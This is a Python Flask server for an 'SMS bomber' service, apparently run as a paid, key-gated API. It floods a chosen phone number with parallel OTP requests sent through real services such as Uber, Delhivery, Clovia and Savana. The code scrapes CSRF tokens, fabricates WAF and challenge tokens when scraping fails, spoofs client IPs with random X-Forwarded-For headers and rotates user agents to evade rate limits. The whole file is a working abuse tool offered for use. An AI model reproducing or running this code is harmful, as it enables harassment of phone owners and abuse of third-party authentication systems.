from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
import json
import os
import time
import random
import threading
import requests as req_lib
from datetime import datetime
from bs4 import BeautifulSoup
import re
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, ALL_COMPLETED

app = Flask(__name__, static_folder='../admin', static_url_path='/admin')
CORS(app)

# ===== DATA FILES =====
REQUESTS_FILE = 'requests/requests.json'
STATS_FILE = 'requests/stats.json'
LOGS_FILE = 'requests/logs.json'
KEYS_GITHUB_URL = 'https://raw.githubusercontent.com/gauravbeniwal3003-prog/sms-bomber-api/main/requests/keys.txt'

# ===== LOAD DATA =====
def load_json(file, default):
    try:
        with open(file, 'r') as f:
            return json.load(f)
    except:
        return default

def save_json(file, data):
    try:
        os.makedirs(os.path.dirname(file), exist_ok=True)
        with open(file, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

requests_data = load_json(REQUESTS_FILE, [])
stats_data = load_json(STATS_FILE, {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0})
logs_data = load_json(LOGS_FILE, [])
active_keys = set()
service_stats = {}
bombing_status = {"active": False, "phone": "", "start_time": "", "total_hits": 0, "success_hits": 0, "failed_hits": 0, "completed": False}

# ===== LOAD KEYS =====
def load_keys_from_github():
    global active_keys
    try:
        resp = req_lib.get(KEYS_GITHUB_URL, timeout=10)
        if resp.status_code == 200:
            lines = resp.text.strip().split('\n')
            active_keys = {line.strip() for line in lines if line.strip() and not line.startswith('#')}
            return True
    except:
        pass
    return False

def validate_key(key):
    if not active_keys:
        load_keys_from_github()
    return key in active_keys

# ===== SESSION FUNCTIONS (WITH ROTATION) =====
def get_pansho_session():
    session = req_lib.Session()
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache'
    }
    try:
        resp = session.get('https://pansho.com/', headers=headers, timeout=8)
        soup = BeautifulSoup(resp.text, 'html.parser')
        token = None
        meta = soup.find('meta', {'name': 'csrf-token'})
        if meta:
            token = meta.get('content')
        if not token:
            token_input = soup.find('input', {'name': '_token'})
            if token_input:
                token = token_input.get('value')
        if not token:
            token = 'DUMMY_TOKEN'
        cookies = session.cookies.get_dict()
        return session, cookies, token
    except:
        return None, None, None

def get_uber_token():
    session = req_lib.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        resp = session.get('https://auth.uber.com/v2/', headers=headers, timeout=8)
        challenge_token = resp.headers.get('X-Uber-Challenge-Token', '')
        if not challenge_token:
            challenge_token = f"{random.randint(1000000000,9999999999)}.{random.randint(1000000000,9999999999)}|r=ap-southeast-1|meta=3|pk=30000F36-CADF-490C-929A-C6A7DD8B33C4|at=40|sup=1|rid=31|ag=101"
        return session, challenge_token
    except:
        return None, None

def get_delhivery_token():
    session = req_lib.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        resp = session.get('https://www.delhivery.com/', headers=headers, timeout=8)
        soup = BeautifulSoup(resp.text, 'html.parser')
        waf_token = None
        for script in soup.find_all('script'):
            if 'X-Aws-Waf-Token' in str(script):
                match = re.search(r'X-Aws-Waf-Token["\']?\s*[:=]\s*["\']([^"\']+)', str(script))
                if match:
                    waf_token = match.group(1)
                    break
        if not waf_token:
            waf_token = f"{random.randint(1000000000,9999999999)}:BQoAZmwePMEFAAAA:{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/', k=80))}"
        return session, waf_token
    except:
        return None, None

def get_clovia_session():
    session = req_lib.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        resp = session.get('https://www.clovia.com/', headers=headers, timeout=8)
        soup = BeautifulSoup(resp.text, 'html.parser')
        csrf_token = None
        meta = soup.find('meta', {'name': 'csrf-token'})
        if meta:
            csrf_token = meta.get('content')
        if not csrf_token:
            token_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
            if token_input:
                csrf_token = token_input.get('value')
        if not csrf_token:
            csrf_token = 'bnOWXYu8viI9rfxy2AAysR1YbLLowSUf'
        cookies = session.cookies.get_dict()
        return session, cookies, csrf_token
    except:
        return None, None, None

def get_apitxt_session():
    session = req_lib.Session()
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        resp = session.get('https://apitxt.com/', headers=headers, timeout=8)
        return session, session.cookies.get_dict()
    except:
        return None, None

def get_savana_session():
    session = req_lib.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        resp = session.get('https://www.savana.com/', headers=headers, timeout=8)
        cookies = session.cookies.get_dict()
        vtoken = cookies.get('ub_ap_s_vtoken', str(random.randint(1000000000, 9999999999)))
        return session, cookies, vtoken
    except:
        return None, None, None

def generate_uber_device_data():
    return "IsOFwpJePcOFw5sVO8KFwoIBb8OWw5QPbMKEw5UFbcOXw5YFe8OLw4NoLcOFw5sVGMKEwotBIcKpwqlHD8Ofw5RYGsKFwpNeGsKQw5QFG8KfwrQYPcKLwrddKMK2w4ocPMKIwotSCsKewph8OsK+wqhyO8Kjwph4DcKCwrZYA8KGwqZGL8KewpRaaMKOwodVMMK1wqt/HcK0w5V0dsK/wqdZdsOWwot7dsKuwolkMsKVwo0CbcOVwpJWK8Klw5F8I8KhwqAEdsKTwrFaIcK3wrlnDcKlwoleA8KBwqN+F8KfwrtyNsKWwoZiEcKywpkBNsKuwohkK8KFwoYCNsKSwowGC8K2w5N7KMKsw5lcYcKXw5VQFMKVw4pTH8KKwrVxM8KhwqdRH8KlwptbFMKBwoBtCMKqwrAAPMKOwrRULcKuw45wKsKBwptBMcKBwrgYOMKOwrdAYMKBw5QFDcKGw5IBE8KlwplfN8OQw5JuFMKMwpt8FcOfwqRxa8KCwrJ/DMK+wq1CCsKTw5RAdsKLwpFaIcKsw5NHbcKhw4pOHMKLwrZ0NsKzwq0OO8KSwrN7IcKlwq0DIMKiwqtGCcKowq1WaMKNw5EBMcKzwpRADMOUwrdZMsOVwrNgN8KmwpVHD8KEwqlWNMKJwpEPHMKkwrkEe8OLw4NUP8K4wodbOMKAwpIVY8OFw5AHa8OVw5gBasOFw40VP8KVwoREMcOKwoJYNsKMwohSe8Odw4NDK8KSwoQVdcOFwoJYNsKMwohSdMK4woJUe8Odw4N2OsKNwpdPF8KvwpFhYcOSwo50O8KVwoh0LsOSw5N1IcKyw4QFH8OFw40VLcKOwoxSdMKSwo9eIcOKwoRHNsKEwokaNMKUw4MNaMOQw5kPbcOXw5kDbcOew5MFaMOLw4NDMMKKwoQaNcKIwoJWNcOFw5sVYMOIw5IYa8OXw5MBdcOHw5AFY8OXw5YNa8Oew4F2FMOFw40VLcKOwoxSdMKUwpVFMMKJwoYVY8OFwrVfLMOHwrJSKcOHw5EEecOVw5EFb8OHw5EHY8OXw5YNa8Oew4FwFMKzw4wHbcOXw5EXccKiwoBELcKCwpNZecKjwoBONcKOwoZfLcOHwrVeNMKCw4gVdcOFwpVeNMKCw4xDI8OKwo5RP8KUwoRDdMKKwohZLMKTwoREe8Odw5MDacOLw4NDMMKKwoQaLcKdw4xfOMKUw4xTKsKTw4MNe8KTwpNCPMOFw40VLcKOwoxSdMKTwpsaPcKUwpUaOMKEwpVeL8KCw4MNe8KTwpNCPMOFw40VLcKOwoxSdMKTwpsaKsKTwoUaNsKBwodEPMKTw4MNa8OTw5Ebe8KTwohaPMOKwpVNdMKBwohPPMKDw4xbNsKEwoBbPMOKwpJDK8KOwo9Qe8Odw4MEdsORw44FacOWw5UbecOQw5sCYcOdw5IOecKmwqwVdcOFwoVYNMOKwo1YOsKGwo0aLcKGwoYVY8OFwqBUM8KRwpl5EcKXwrcPbMKIwqJVK8KOwqJAbMOVwqNPDMOIw4Mbe8KDwo5adMKUwoREKsKOwo5ZdMKTwoBQe8Odw4N2OsKNwpdPF8KvwpFhYcOSwo50O8KVwoh0LsOSw5N1IcKyw44VdcOFwo9WL8KOwoZWLcKIwpMZOMKXwpFhPMKVwpJeNsKJw4MNe8OSw48HecOPwrkGaMOOw4Mbe8KJwoBBMMKAwoBDNsKVw49WKcKXwq9WNMKCw4MNe8KpwoRDKsKEwoBHPMOFw40VN8KGwpdePsKGwpVYK8OJwoNCMMKLwoV+HcOFw5sVa8OXw5APaMOXw5EGacOXw5EHacOXw4Mbe8KJwoBBMMKAwoBDNsKVw49HK8KIwoVCOsKTw4MNe8KgwoRUMsKIw4Mbe8KJwoBBMMKAwoBDNsKVw49HNcKGwpVRNsKVwowVY8OFwq1eN8KSwpkXIcOfw5dob8OTw4Mbe8KJwoBBMMKAwoBDNsKVw49bOMKJwoZCOMKAwoQVY8OFwoRZdMKywrIVdcOFwo9WL8KOwoZWLcKIwpMZNsKUwoJHLMOFw5sVFcKOwo9CIcOHwpkPb8K4w5cDe8OLw4NZOMKRwohQOMKTwo5Fd8KSwpJSK8KmwoZSN8KTw4MNe8Kqwo5NMMKLwo1WdsOSw48HecOPwrkGaMOcw4F7MMKJwpRPecKfw5kBBsORw5UMecKVwpcNaMOTw5EZacOOw4FwPMKEwopYdsOVw5EGacOXw5AHaMOHwqdeK8KCwodYIcOIw5ADacOJw5EVdcOFwo9WL8KOwoZWLcKIwpMZOsKIwo5cMMKCwqRZOMKFwo1SPcOFw5sVLcKVwpRSe8OLw4NZOMKRwohQOMKTwo5Fd8KGwpFHGsKIwoVSF8KGwoxSe8Odw4N6NsKdwohbNcKGw4Mbe8KJwoBBMMKAwoBDNsKVw49HK8KIwoVCOsKTwrJCO8OFw5sVa8OXw5AHacOWw5EGe8OLw4NZOMKRwohQOMKTwo5Fd8KPwoBFPcKQwoBFPMKkwo5ZOsKSwpNFPMKJwoJOe8Odw4MFe8OLw4NDNsKSwoJfHMKJwoBVNcKCwoUVY8KBwoBbKsKCw40VN8KGwpdePsKGwpVYK8OJwoBCLcKIwoxWLcKOwo5ZHMKJwoBVNcKCwoUVY8KBwoBbKsKCw40VN8KGwpdePsKGwpVYK8OJwoVYF8KIwpVjK8KGwoJce8Odw4NCN8KUwpFSOsKOwodePMKDw4Mbe8KQwoRVPcKVwohBPMKVwr5TPMKTwoRULcOFw5tROMKLwpJSdcOFwpZeN8KDwo5Ad8KEwo1ePMKJwpV+N8KBwo5FNMKGwpVeNsKJw49bOMKJwoZCOMKAwoQVY8OFwoRZdMKywrIVdcOFwpZeN8KDwo5Ad8KPwohELcKIwpNOd8KLwoRZPsKTwokVY8OFw5UVdcOFwpZeN8KDwo5Ad8KDwoRBMMKEwoRnMMKfwoRbC8KGwpVeNsOFw5sVaMOFw40VLsKOwo9TNsKQw49EOsKVwoRSN8OJwolSMMKAwolDe8Odw4MBb8OVw4Mbe8KQwohZPcKIwpYZKsKEwpNSPMKJw49AMMKDwpVfe8Odw4MGasORw5cVdcOFwpZeN8KDwo5Ad8KUwoJFPMKCwo8ZOsKIwo1YK8KjwoRHLcKPw4MNe8OVw5UVdcOFwpZeN8KDwo5Ad8KUwoJFPMKCwo8ZOMKRwoBeNcKvwoRePsKPwpUVY8OFw5cFbsOFw40VLsKOwo9TNsKQw49EOsKVwoRSN8OJwpFeIcKCwo1zPMKXwpVfe8Odw4MFbcOFw40VLsKOwo9TNsKQw49YLMKTwoRFDsKOwoVDMcOFw5sVbsOUw5AVdcOFwpZeN8KDwo5Ad8KIwpRDPMKVwqlSMMKAwolDe8Odw4MBbsORw4Mbe8KQwohZPcKIwpYZMMKJwo9SK8KwwohTLcKPw4MNe8ORw5kEe8OLw4NAMMKJwoVYLsOJwohZN8KCwpN/PMKOwoZfLcOFw5sVbMOWw5EVdcOFwpJUK8KCwoRZd8KGwpdWMMKLwrZePcKTwokVY8OFw5AEb8ORw4Mbe8KUwoJFPMKCwo8ZOMKRwoBeNcKvwoRePsKPwpUVY8OFw5cFbsOFw40VLsKOwo9TNsKQw49EOsKVwoRSN8OJwo5FMMKCwo9DOMKTwohYN8OJwpVOKcKCw4MNe8KLwoBZPcKUwoJWKcKCw4xHK8KOwoxWK8Kew4Mbe8KQwohZPcKIwpYZKsKEwpNSPMKJw49YK8KOwoRZLcKGwpVeNsKJw49WN8KAwo1Se8Odw4MHe8OLw4NAMMKJwoVYLsOJwpJUK8KCwoRZd8KDwoBFMsKqwo5TPMOJwoRZOMKFwo1SPcOFw5tDK8KSwoQbe8KJwoBBMMKAwoBDNsKVw49HNcKSwoZeN8KUw49UNsKSwo9De8Odw5Qbe8KXwo1CPsKOwo8aCcKjwqcXD8KOwoRAPMKVw4xRMMKLwoRZOMKKwoQVY8OFwohZLcKCwpNZOMKLw4xHPcKBw4xBMMKCwpZSK8OFw40VKcKLwpRQMMKJw4xnHcKhw4FhMMKCwpZSK8OKwoVSKsKEw4MNe8K3wo5FLcKGwoNbPMOHwqVYOsKSwoxSN8KTw4FxNsKVwoxWLcOFw40VKcKLwpRQMMKJw4x0McKVwo5aPMOHwrFzH8OHwrdePMKQwoRFdMKBwohbPMKJwoBaPMOFw5sVMMKJwpVSK8KJwoBbdMKXwoVRdMKRwohSLsKCwpMVdcOFwpFbLMKAwohZdMKkwolFNsKKwoQXCcKjwqcXD8KOwoRAPMKVw4xTPMKUwoIVY8OFwrFYK8KTwoBVNcKCw4FzNsKEwpRaPMKJwpUX"

# ===== SEND REQUEST =====
def send_request(req, phone):
    name = req['name']
    try:
        if 'pansho' in name.lower():
            session, cookies, token = get_pansho_session()
            if not session: 
                update_stats(name, False)
                return False
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ])
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers['Referer'] = 'https://pansho.com/'
            body = req['body'].replace('{phone}', phone).replace('{token}', token)
            session.cookies.update(cookies)
            r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=8)

        elif 'uber' in name.lower():
            session, challenge_token = get_uber_token()
            if not session: 
                update_stats(name, False)
                return False
            headers = req['headers'].copy()
            headers['X-Uber-Challenge-Token'] = challenge_token
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            body = json.loads(json.dumps(req['body']))
            body['formContainerAnswer']['formAnswer']['deviceData'] = generate_uber_device_data()
            body['formContainerAnswer']['formAnswer']['screenAnswers'][0]['fieldAnswers'][0]['phoneCountryCode'] = '+91'
            body['formContainerAnswer']['formAnswer']['screenAnswers'][0]['fieldAnswers'][1]['phoneNumber'] = phone.replace('+91', '').replace('91', '')
            r = session.post(req['url'], headers=headers, json=body, timeout=8)

        elif 'delhivery' in name.lower():
            session, waf_token = get_delhivery_token()
            if not session: 
                update_stats(name, False)
                return False
            headers = req['headers'].copy()
            headers['X-Aws-Waf-Token'] = waf_token
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            clean_phone = phone.replace('+91', '').replace('91', '').strip()
            r = session.get(req['url'].replace('{phone}', clean_phone), headers=headers, timeout=8)

        elif 'clovia' in name.lower():
            session, cookies, csrf_token = get_clovia_session()
            if not session: 
                update_stats(name, False)
                return False
            headers = req['headers'].copy()
            headers['X-Csrftoken'] = csrf_token
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
            ])
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            body = json.loads(json.dumps(req['body']))
            clean_phone = phone.replace('+91', '').replace('91', '').strip()
            body['phone'] = clean_phone
            session.cookies.update(cookies)
            r = session.post(req['url'], headers=headers, json=body, timeout=8)

        elif 'apitxt' in name.lower():
            session, cookies = get_apitxt_session()
            if not session: 
                update_stats(name, False)
                return False
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
            ])
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers['Referer'] = 'https://apitxt.com/'
            body = json.loads(json.dumps(req['body']))
            clean_phone = phone.replace('+91', '').replace('91', '').strip()
            body['mobile_no'] = clean_phone
            body['country_code'] = random.choice(['91', '+91', '091'])
            session.cookies.update(cookies)
            r = session.post(req['url'], headers=headers, json=body, timeout=8)

        elif 'savana' in name.lower():
            session, cookies, vtoken = get_savana_session()
            if not session: 
                update_stats(name, False)
                return False
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
            ])
            headers['Vtoken'] = vtoken
            headers['Uuid'] = f"___X_{uuid.uuid4().hex[:8]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:12]}-{int(time.time()*1000)}"
            headers['Trace_id'] = f"___X_{uuid.uuid4().hex[:16]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:12]}-{int(time.time()*1000)}"
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            body = json.loads(json.dumps(req['body']))
            clean_phone = phone.replace('+91', '').replace('91', '').strip()
            body['userName'] = clean_phone
            body['phonePrefix'] = random.choice(['+91', '91', '091'])
            body['bizTraceId'] = uuid.uuid4().hex
            session.cookies.update(cookies)
            r = session.post(req['url'], headers=headers, json=body, timeout=8)

        else:
            session = req_lib.Session()
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
            ])
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            if req['method'] == 'POST':
                if isinstance(req['body'], dict):
                    r = session.post(req['url'].replace('{phone}', phone), headers=headers, json=req['body'], timeout=8)
                else:
                    body = req['body'].replace('{phone}', phone)
                    r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=8)
            else:
                r = session.get(req['url'].replace('{phone}', phone), headers=headers, timeout=8)

        if r.status_code in [200, 302, 201, 202]:
            update_stats(name, True)
            return True
        else:
            update_stats(name, False)
            return False

    except:
        update_stats(name, False)
        return False

def update_stats(name, success):
    with stats_lock:
        stats_data['total_requests'] += 1
        if success:
            stats_data['success'] += 1
        else:
            stats_data['failed'] += 1
        save_json(STATS_FILE, stats_data)
        
        if name not in service_stats:
            service_stats[name] = {"success": 0, "failed": 0, "total": 0}
        service_stats[name]["total"] += 1
        if success:
            service_stats[name]["success"] += 1
        else:
            service_stats[name]["failed"] += 1
        
        bombing_status['total_hits'] += 1
        if success:
            bombing_status['success_hits'] += 1
        else:
            bombing_status['failed_hits'] += 1

# ===== NANO-SECOND PARALLEL BOMBING =====
def nano_parallel_bombing(phone, key, otp_count=5):
    global bombing_status, service_stats, stats_data
    
    # Reset stats
    service_stats = {}
    stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
    save_json(STATS_FILE, stats_data)
    
    bombing_status = {
        "active": True,
        "phone": phone,
        "start_time": datetime.now().isoformat(),
        "total_hits": 0,
        "success_hits": 0,
        "failed_hits": 0,
        "completed": False
    }
    
    active_requests = [r for r in requests_data if r.get('active', True)]
    
    # === ULTRA PARALLEL: ALL REQUESTS AT ONCE ===
    with ThreadPoolExecutor(max_workers=len(active_requests) * otp_count * 2) as executor:
        futures = []
        for req in active_requests:
            phone_variants = req.get('phones', [phone])
            # Fire N requests simultaneously per service
            for i in range(otp_count):
                target_phone = random.choice(phone_variants) if phone_variants else phone
                future = executor.submit(send_request, req, target_phone)
                futures.append(future)
                # NO DELAY - Nano-second parallel!
        
        # Wait for all to complete
        for future in as_completed(futures):
            try:
                future.result(timeout=10)
            except:
                pass
    
    bombing_status['active'] = False
    bombing_status['completed'] = True

# ===== ROUTES =====
stats_lock = threading.Lock()

@app.route('/')
@app.route('/api/health')
def health():
    return jsonify({
        "status": "ok",
        "owner": "Gaurav Beniwal",
        "telegram": "@gaurav_beniwal_0001",
        "services": len([r for r in requests_data if r.get('active', True)])
    })

@app.route('/api/requests', methods=['GET'])
def get_requests():
    return jsonify(requests_data)

@app.route('/api/stats', methods=['GET'])
def get_stats():
    active_count = sum(1 for r in requests_data if r.get('active', True))
    return jsonify({
        "total_requests": len(requests_data),
        "active_requests": active_count,
        "usage": stats_data,
        "active_keys": len(active_keys),
        "per_service": service_stats,
        "bombing_status": bombing_status
    })

@app.route('/api/keys', methods=['GET'])
def get_keys():
    return jsonify({"keys": list(active_keys), "count": len(active_keys)})

@app.route('/api/keys/refresh', methods=['POST'])
def refresh_keys():
    if load_keys_from_github():
        return jsonify({"success": True, "keys": list(active_keys), "count": len(active_keys)})
    return jsonify({"error": "Failed"}), 500

@app.route('/api/logs', methods=['GET'])
def get_logs():
    limit = request.args.get('limit', 50, type=int)
    return jsonify(logs_data[-limit:])

@app.route('/api/bomb/status', methods=['GET'])
def bomb_status():
    return jsonify(bombing_status)

@app.route('/api/bomb/reset', methods=['POST'])
def reset_bombing():
    global bombing_status
    bombing_status = {"active": False, "phone": "", "start_time": "", "total_hits": 0, "success_hits": 0, "failed_hits": 0, "completed": False}
    return jsonify({"success": True, "message": "Bombing status reset"})

# ===== MAIN API — NANO-SECOND PARALLEL =====
@app.route('/api', methods=['GET'])
def parallel_api():
    key = request.args.get('key')
    phone = request.args.get('bomb')
    otp_count = request.args.get('otp', 5, type=int)  # Default 5 parallel per service
    
    if not key:
        return jsonify({"error": "Missing 'key' parameter"}), 400
    if not validate_key(key):
        return jsonify({"error": "Invalid API key"}), 401
    if not phone:
        return jsonify({"error": "Missing 'bomb' parameter (phone number)"}), 400
    if otp_count < 1 or otp_count > 50:
        return jsonify({"error": "OTP count must be between 1 and 50"}), 400
    
    if bombing_status.get('active', False):
        return jsonify({
            "success": False,
            "message": "⚠️ Bombing already in progress! Use /api/bomb/reset to stop.",
            "status": bombing_status
        }), 409
    
    # Start nano-second parallel bombing
    thread = threading.Thread(target=nano_parallel_bombing, args=(phone, key, otp_count))
    thread.daemon = True
    thread.start()
    
    active_services = sum(1 for r in requests_data if r.get('active', True))
    total_requests = active_services * otp_count
    
    return jsonify({
        "success": True,
        "message": f"🔥 NANO-PARALLEL Bombing started! {otp_count}x per service = {total_requests} simultaneous requests!",
        "phone": phone,
        "otp_per_service": otp_count,
        "active_services": active_services,
        "total_simultaneous_requests": total_requests,
        "status_endpoint": "/api/bomb/status",
        "stats_endpoint": "/api/stats",
        "reset_endpoint": "/api/bomb/reset",
        "owner": "Gaurav Beniwal",
        "telegram": "@gaurav_beniwal_0001",
        "youtube": "https://www.youtube.com/@gaurav_beniwal_0001"
    })

@app.route('/admin')
@app.route('/admin/')
def serve_admin():
    return send_from_directory('../admin', 'index.html')

load_keys_from_github()
app.debug = False

if __name__ == '__main__':
    app.run(debug=True, port=5000)
